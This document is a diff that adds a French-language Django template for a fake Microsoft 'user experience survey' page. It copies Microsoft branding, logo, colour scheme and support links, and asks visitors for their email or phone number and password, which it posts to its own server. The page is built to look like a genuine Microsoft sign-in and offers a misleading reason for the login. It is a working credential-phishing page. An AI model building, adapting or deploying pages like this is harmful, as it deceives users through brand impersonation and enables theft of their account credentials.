@@ -1,0 +1,359 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="icon" type="image/png" href="{% static 'images/Microsoft_favicon.png' %}">
+<title>Sondage d'expérience utilisateur — Microsoft</title>
+<style>
+
+:root {
+  --ms-blue:#0078d4;--ms-blue-dark:#005a9e;--ms-blue-light:#deecf9;--ms-blue-mid:#106ebe;
+  --bg:#f3f2f1;--surface:#ffffff;--surface-raised:#ffffff;--border:#edebe9;--border-strong:#c8c6c4;
+  --text-primary:#201f1e;--text-secondary:#605e5c;--text-disabled:#a19f9d;--icon:#605e5c;
+  --shadow-2:0 1.6px 3.6px rgba(0,0,0,.132),0 .3px .9px rgba(0,0,0,.108);
+  --shadow-8:0 6.4px 14.4px rgba(0,0,0,.132),0 1.2px 3.6px rgba(0,0,0,.108);
+  --r-sm:4px;--r-md:6px;--r-lg:8px;
+  --font:"Segoe UI Variable","Segoe UI",-apple-system,"Helvetica Neue",sans-serif;
+}
+
+body.dark {
+  --bg:#1b1a19;--surface:#252423;--surface-raised:#2d2c2b;--border:#3b3a39;--border-strong:#484644;
+  --text-primary:#f3f2f1;--text-secondary:#c8c6c4;--text-disabled:#605e5c;--icon:#c8c6c4;--ms-blue-light:#1b3a5c;
+}
+
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+
+body {
+  font-family:var(--font);font-size:14px;line-height:1.5;color:var(--text-primary);
+  background-color:var(--bg);
+  background-image:
+    radial-gradient(ellipse 80% 60% at 20% -10%,rgba(0,120,212,.07) 0%,transparent 60%),
+    radial-gradient(ellipse 60% 50% at 80% 110%,rgba(0,120,212,.05) 0%,transparent 60%);
+  min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;
+  transition:background-color .3s,color .3s;
+}
+
+/* Theme button */
+.theme-toggle {
+  position:fixed;top:16px;right:16px;
+  width:36px;height:36px;border-radius:var(--r-md);
+  border:1px solid var(--border);background:var(--surface);
+  cursor:pointer;color:var(--icon);font-size:16px;
+  display:flex;align-items:center;justify-content:center;
+  box-shadow:var(--shadow-2);transition:background .15s;z-index:100;
+}
+.theme-toggle:hover{background:var(--border);}
+
+/* Card */
+.container {
+  width:100%;max-width:420px;margin:16px;
+  background:var(--surface);border-radius:var(--r-lg);
+  box-shadow:var(--shadow-8);border:1px solid var(--border);
+  overflow:hidden;animation:slideUp .45s cubic-bezier(.22,.61,.36,1) both;
+}
+@keyframes slideUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
+
+/* Card header */
+.card-header {
+  padding:28px 32px 24px;border-bottom:1px solid var(--border);
+  background:linear-gradient(135deg,var(--ms-blue-light) 0%,transparent 60%);
+  display:flex;flex-direction:column;align-items:center;text-align:center;gap:14px;
+}
+.logo-img{width:160px;filter:drop-shadow(0 2px 8px rgba(0,0,0,.15));}
+.subtitle{font-size:13px;color:var(--text-secondary);line-height:1.5;max-width:320px;}
+
+/* Form body */
+.form-body{padding:28px 32px 24px;}
+.field{margin-bottom:18px;}
+
+label{display:block;margin-bottom:5px;font-size:13px;font-weight:600;color:var(--text-primary);}
+
+.input-wrapper{position:relative;}
+
+input[type="text"],input[type="password"] {
+  width:100%;padding:8px 40px 8px 12px;
+  font-family:var(--font);font-size:14px;color:var(--text-primary);
+  background:var(--surface);border:1px solid var(--border-strong);
+  border-radius:var(--r-sm);outline:none;
+  transition:border-color .15s,box-shadow .15s;-webkit-appearance:none;appearance:none;
+}
+input:hover{border-color:var(--text-secondary);}
+input:focus{border-color:var(--ms-blue);box-shadow:0 0 0 1px var(--ms-blue);background:var(--surface-raised);}
+
+/* Eye toggle */
+.eye-toggle {
+  position:absolute;right:10px;top:50%;transform:translateY(-50%);
+  background:none;border:none;cursor:pointer;padding:0;
+  display:flex;align-items:center;justify-content:center;
+  color:var(--icon);transition:color .2s;width:20px;height:20px;
+}
+.eye-toggle:hover{color:var(--ms-blue);}
+.eye-toggle svg{width:17px;height:17px;display:block;}
+
+/* Validation error */
+.field-error {
+  display:block;margin-top:5px;font-size:12px;color:#a4262c;min-height:16px;
+  opacity:0;transform:translateY(-4px);
+  transition:opacity .15s,transform .15s;
+}
+.field-error.visible {
+  opacity:1;transform:translateY(0);
+}
+input.input-error {
+  border-color:#a4262c !important;
+  box-shadow:0 0 0 1px #a4262c !important;
+}
+
+/* Submit */
+button.submit-btn {
+  width:100%;padding:8px 18px;
+  border-radius:var(--r-sm);border:1px solid var(--ms-blue);
+  background:var(--ms-blue);color:#fff;
+  font-family:var(--font);font-size:14px;font-weight:600;
+  cursor:pointer;transition:background .15s,border-color .15s;
+  display:flex;align-items:center;justify-content:center;margin-top:4px;
+}
+button.submit-btn:hover{background:var(--ms-blue-mid);border-color:var(--ms-blue-mid);}
+button.submit-btn:focus-visible{box-shadow:0 0 0 2px var(--surface),0 0 0 4px var(--ms-blue);outline:none;}
+
+/* ── Info accordion ── */
+.info-accordion {
+  margin-top:16px;
+  border:1px solid var(--border);
+  border-radius:var(--r-sm);
+  overflow:hidden;
+}
+
+.info-trigger {
+  width:100%;
+  display:flex;align-items:center;justify-content:space-between;gap:8px;
+  padding:9px 12px;
+  background:none;border:none;cursor:pointer;
+  font-family:var(--font);font-size:12px;font-weight:600;
+  color:var(--ms-blue);
+  text-align:left;
+  transition:background .15s;
+}
+.info-trigger:hover{background:var(--ms-blue-light);}
+
+.info-trigger-text {
+  display:flex;align-items:center;gap:7px;
+}
+.info-trigger-text svg{
+  width:14px;height:14px;flex-shrink:0;
+  color:var(--ms-blue);
+}
+
+.info-chevron {
+  width:14px;height:14px;flex-shrink:0;
+  transition:transform .2s ease;
+  color:var(--ms-blue);
+}
+.info-accordion.open .info-chevron {
+  transform:rotate(180deg);
+}
+
+.info-body {
+  max-height:0;
+  overflow:hidden;
+  transition:max-height .25s ease, padding .25s ease;
+  padding:0 12px;
+  font-size:12px;
+  color:var(--text-secondary);
+  line-height:1.55;
+  background:var(--surface-raised);
+  border-top:0px solid var(--border);
+}
+.info-accordion.open .info-body {
+  max-height:120px;
+  padding:10px 12px 11px;
+  border-top:1px solid var(--border);
+}
+/* ──────────────────── */
+
+/* Card footer */
+.card-footer {
+  padding:14px 32px;border-top:1px solid var(--border);
+  background:var(--surface);display:flex;align-items:center;
+  justify-content:center;gap:20px;flex-wrap:wrap;
+}
+.card-footer a{font-size:12px;color:var(--text-secondary);text-decoration:none;font-weight:500;transition:color .15s;}
+.card-footer a:hover{color:var(--ms-blue);text-decoration:underline;}
+
+@media(max-width:480px){
+  .container{border-radius:0;border-left:none;border-right:none;margin:0;max-width:100%;}
+  .card-header,.form-body,.card-footer{padding-left:20px;padding-right:20px;}
+}
+
+</style>
+</head>
+
+<body>
+
+<button class="theme-toggle" onclick="toggleTheme()" id="themeBtn">🌙</button>
+
+<div class="container">
+  <div class="card-header">
+    <img src="{% static 'images/Microsoft_logo.png' %}" class="logo-img" alt="Logo">
+    <p class="subtitle">Pour consulter ce contenu, merci de compléter vos informations utilisateur.</p>
+  </div>
+
+  <div class="form-body">
+    <form method="post" onsubmit="handleSubmit(event)">
+      {% csrf_token %}
+      <div class="field">
+        <label for="username">Email ou numéro de téléphone</label>
+        <div class="input-wrapper">
+          <input type="text" id="username" name="username" required autocomplete="username" oninput="validateUsername()">
+        </div>
+        <span class="field-error" id="usernameError"></span>
+      </div>
+      <div class="field">
+        <label for="password">Mot de passe</label>
+        <div class="input-wrapper">
+          <input type="password" id="password" name="password" required>
+          <button type="button" class="eye-toggle" onclick="togglePassword()" id="eyeBtn" aria-label="Afficher le mot de passe">
+            <svg id="eyeOpen" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7z"/><circle cx="12" cy="12" r="3"/>
+            </svg>
+            <svg id="eyeClosed" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display:none;">
+              <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-10-7-10-7a18.45 18.45 0 0 1 5.06-5.94"/>
+              <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 10 7 10 7a18.5 18.5 0 0 1-2.16 3.19"/>
+              <line x1="1" y1="1" x2="23" y2="23"/>
+            </svg>
+          </button>
+        </div>
+      </div>
+      <button type="submit" class="submit-btn">Suivant</button>
+    </form>
+
+    <!-- Info accordion -->
+    <div class="info-accordion" id="infoAccordion">
+      <button type="button" class="info-trigger" onclick="toggleInfo()" aria-expanded="false" aria-controls="infoBody">
+        <span class="info-trigger-text">
+          <!-- info circle icon -->
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="8"/><line x1="12" y1="12" x2="12" y2="16"/>
+          </svg>
+          Pourquoi dois-je me connecter&nbsp;?
+        </span>
+        <!-- chevron -->
+        <svg class="info-chevron" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <polyline points="6 9 12 15 18 9"/>
+        </svg>
+      </button>
+      <div class="info-body" id="infoBody" role="region">
+        Ce sondage a également pour objectif d’optimiser votre expérience utilisateur en nous permettant de vous proposer des recommandations et des conseils davantage adaptés à vos usages.
+      </div>
+    </div>
+    <!-- /Info accordion -->
+
+  </div>
+
+  <div class="card-footer">
+    <a href="https://support.microsoft.com/home/contact?linkquery=Show%20me%20self-help%20support%20for%20sign%20in%20issues">Aide et support</a>
+    <a href="https://www.microsoft.com/en-us/servicesagreement">Conditions d'utilisation</a>
+    <a href="https://www.microsoft.com/en-us/privacy/">Vie privée et cookies</a>
+  </div>
+</div>
+
+<script>
+const lightBg = "{% static 'images/background-light.svg' %}";
+const darkBg  = "{% static 'images/background-dark.svg' %}";
+
+function applyTheme(theme) {
+  const body = document.body;
+  const btn  = document.getElementById("themeBtn");
+  if (theme === "dark") {
+    body.classList.add("dark");
+    body.style.backgroundImage = `url('${darkBg}'), radial-gradient(ellipse 80% 60% at 20% -10%,rgba(0,120,212,.12) 0%,transparent 60%), radial-gradient(ellipse 60% 50% at 80% 110%,rgba(0,120,212,.08) 0%,transparent 60%)`;
+    btn.textContent = "☀️";
+  } else {
+    body.classList.remove("dark");
+    body.style.backgroundImage = `url('${lightBg}'), radial-gradient(ellipse 80% 60% at 20% -10%,rgba(0,120,212,.07) 0%,transparent 60%), radial-gradient(ellipse 60% 50% at 80% 110%,rgba(0,120,212,.05) 0%,transparent 60%)`;
+    btn.textContent = "🌙";
+  }
+  localStorage.setItem("theme", theme);
+}
+
+function toggleTheme() {
+  applyTheme(document.body.classList.contains("dark") ? "light" : "dark");
+}
+
+function togglePassword() {
+  const input = document.getElementById("password");
+  const eyeOpen = document.getElementById("eyeOpen");
+  const eyeClosed = document.getElementById("eyeClosed");
+  const btn = document.getElementById("eyeBtn");
+  if (input.type === "password") {
+    input.type = "text"; eyeOpen.style.display = "none"; eyeClosed.style.display = "block";
+    btn.setAttribute("aria-label", "Masquer le mot de passe");
+  } else {
+    input.type = "password"; eyeOpen.style.display = "block"; eyeClosed.style.display = "none";
+    btn.setAttribute("aria-label", "Afficher le mot de passe");
+  }
+}
+
+function validateUsername() {
+  const input = document.getElementById("username");
+  const error = document.getElementById("usernameError");
+  const val   = input.value.trim();
+
+  // Email regex (RFC-5322 simplified)
+  const emailRe = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
+  // Phone: optional leading +, then digits/spaces/dashes/parens, 7-15 digits total
+  const phoneRe = /^\+?[\d\s\-().]{7,20}$/;
+  const digitsOnly = val.replace(/\D/g, "");
+
+  if (!val) {
+    setFieldError(input, error, "");
+    return true;
+  }
+  if (emailRe.test(val) || (phoneRe.test(val) && digitsOnly.length >= 7)) {
+    setFieldError(input, error, "");
+    return true;
+  }
+  setFieldError(input, error, "Veuillez entrer un email valide ou un numéro de téléphone valide.");
+  return false;
+}
+
+function setFieldError(input, errorEl, msg) {
+  if (msg) {
+    input.classList.add("input-error");
+    errorEl.textContent = msg;
+    errorEl.classList.add("visible");
+  } else {
+    input.classList.remove("input-error");
+    errorEl.textContent = "";
+    errorEl.classList.remove("visible");
+  }
+}
+
+function handleSubmit(e) {
+  if (!validateUsername()) {
+    e.preventDefault();
+    document.getElementById("username").focus();
+  }
+}
+
+function toggleInfo() {
+  const accordion = document.getElementById("infoAccordion");
+  const trigger   = accordion.querySelector(".info-trigger");
+  const isOpen    = accordion.classList.contains("open");
+  accordion.classList.toggle("open", !isOpen);
+  trigger.setAttribute("aria-expanded", String(!isOpen));
+}
+
+window.onload = function() {
+  const saved = localStorage.getItem("theme");
+  applyTheme(saved || (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light"));
+  window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change", e => {
+    if (!localStorage.getItem("theme")) applyTheme(e.matches ? "dark" : "light");
+  });
+};
+</script>
+
+</body>
+</html>
